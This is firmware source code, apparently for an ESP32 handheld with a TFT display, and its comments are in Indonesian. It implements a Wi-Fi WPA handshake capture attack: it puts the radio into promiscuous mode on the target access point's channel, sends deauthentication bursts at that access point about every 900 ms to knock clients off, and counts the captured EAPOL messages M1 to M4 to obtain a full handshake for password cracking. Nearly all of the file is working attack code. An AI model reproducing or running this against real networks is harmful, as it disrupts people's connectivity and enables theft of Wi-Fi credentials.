#include "eapol.h"
#include "ui_helpers.h"
#include "wifi_state.h"
#include "attack_engine.h"
#include "state_machine.h"
#include "recon.h"

bool isEapolRunning = false;
unsigned long eapolStartTime = 0;
int eapolM1 = 0;
int eapolM2 = 0;
int eapolM3 = 0;
int eapolM4 = 0;
int eapolFull = 0;
int eapolPacketCount = 0;

static bool sawM1 = false;
static bool sawM2 = false;
static bool sawM3 = false;
static bool sawM4 = false;

static void eapolCaptureCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!isEapolRunning) return;
  if (type != WIFI_PKT_DATA) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  uint16_t sig_len = pkt->rx_ctrl.sig_len;
  if (sig_len < 32) return;

  // Cari EtherType EAPOL (0x888E) setelah header MAC + LLC/SNAP.
  bool isEapol = false;
  int eapolPos = 0;
  for (int i = 24; i < sig_len - 1; i++) {
    if (p[i] == 0x88 && p[i + 1] == 0x8E) {
      isEapol = true;
      eapolPos = i + 2;
      break;
    }
  }
  if (!isEapol) return;

  // EAPOL header: version(1), type(1), length(2)
  if (eapolPos + 4 > sig_len) return;
  uint8_t eapolType = p[eapolPos + 1];
  if (eapolType != 3) return; // hanya EAPOL-Key yang relevan untuk handshake

  // Tentukan arah: AP->client jika addr2 == BSSID, client->AP jika addr1 == BSSID
  bool fromAP = (memcmp(&p[10], g_targetBSSID, 6) == 0);
  bool toAP   = (memcmp(&p[4],  g_targetBSSID, 6) == 0);

  eapolPacketCount++;

  if (fromAP && !sawM1) { sawM1 = true; eapolM1++; }
  else if (toAP && sawM1 && !sawM2) { sawM2 = true; eapolM2++; }
  else if (fromAP && sawM1 && sawM2 && !sawM3) { sawM3 = true; eapolM3++; }
  else if (toAP && sawM1 && sawM2 && sawM3 && !sawM4) {
    sawM4 = true; eapolM4++; eapolFull++;
  }
}

void startEapolCapture() {
  if (targetSSID.length() == 0) {
    tft.fillScreen(TFT_BLACK);
    drawHeader("EAPOL CAPTURE", TFT_ORANGE);
    tft.setTextFont(2);
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(10, 40); tft.println("Target belum dipilih.");
    tft.setCursor(10, 60); tft.println("Pilih AP dulu lewat");
    tft.setCursor(10, 80); tft.println("menu EAPOL CAPTURE.");
    delay(300);
    currentState = MAIN_MENU;
    drawMainMenu();
    return;
  }

  radioSetMode(RADIO_STA);
  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(eapolCaptureCb);
  radioSetPromiscuous(true, g_targetChannel);

  isEapolRunning = true;
  eapolStartTime = millis();
  eapolM1 = eapolM2 = eapolM3 = eapolM4 = eapolFull = 0;
  eapolPacketCount = 0;
  sawM1 = sawM2 = sawM3 = sawM4 = false;

  drawEapolCapture(0);
  Serial.printf("[EAPOL] Capture start %s ch=%d\n", targetSSID.c_str(), g_targetChannel);
}

void stopEapolCapture() {
  esp_wifi_set_promiscuous(false);
  radioSetMode(RADIO_STA);
  isEapolRunning = false;
  Serial.println("[EAPOL] Capture stop");
}

void eapolCaptureTick() {
  if (!isEapolRunning) return;

  static unsigned long lastDeauth = 0;
  static unsigned long lastDraw = 0;
  unsigned long now = millis();

  if (now - lastDeauth > 900) {
    lastDeauth = now;
    sendDeauthBurst(g_targetBSSID);
  }
  if (now - lastDraw > 500) {
    lastDraw = now;
    drawEapolCapture(0);
  }
}

void drawEapolCapture(int frame) {
  (void)frame;
  tft.fillScreen(TFT_BLACK);
  drawHeader("EAPOL CAPTURE", TFT_ORANGE);
  tft.setTextFont(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(4, 28);
  tft.print(targetSSID.substring(0, 18));
  tft.print(" ch="); tft.print(g_targetChannel);

  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
           g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5]);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(4, 44);
  tft.print(mac);

  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(4, 66);
  tft.printf("M1:%d  M2:%d  M3:%d  M4:%d", eapolM1, eapolM2, eapolM3, eapolM4);
  tft.setCursor(4, 82);
  tft.printf("FULL:%d  EAPOL:%d", eapolFull, eapolPacketCount);

  unsigned long elapsed = (millis() - eapolStartTime) / 1000;
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(4, 102);
  tft.print("TIME:"); tft.print(elapsed); tft.print("s");

  drawFooter("TOMBOL = STOP");
}

String buildEapolJson() {
  String j = "{\"target\":\"" + String(targetSSID) + "\",";
  j += "\"bssid\":\"";
  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
           g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5]);
  j += String(mac);
  j += "\",\"channel\":" + String(g_targetChannel);
  j += ",\"m1\":" + String(eapolM1);
  j += ",\"m2\":" + String(eapolM2);
  j += ",\"m3\":" + String(eapolM3);
  j += ",\"m4\":" + String(eapolM4);
  j += ",\"full\":" + String(eapolFull);
  j += ",\"packets\":" + String(eapolPacketCount);
  j += ",\"uptime_s\":" + String((unsigned long)(millis()/1000));
  j += "}";
  return j;
}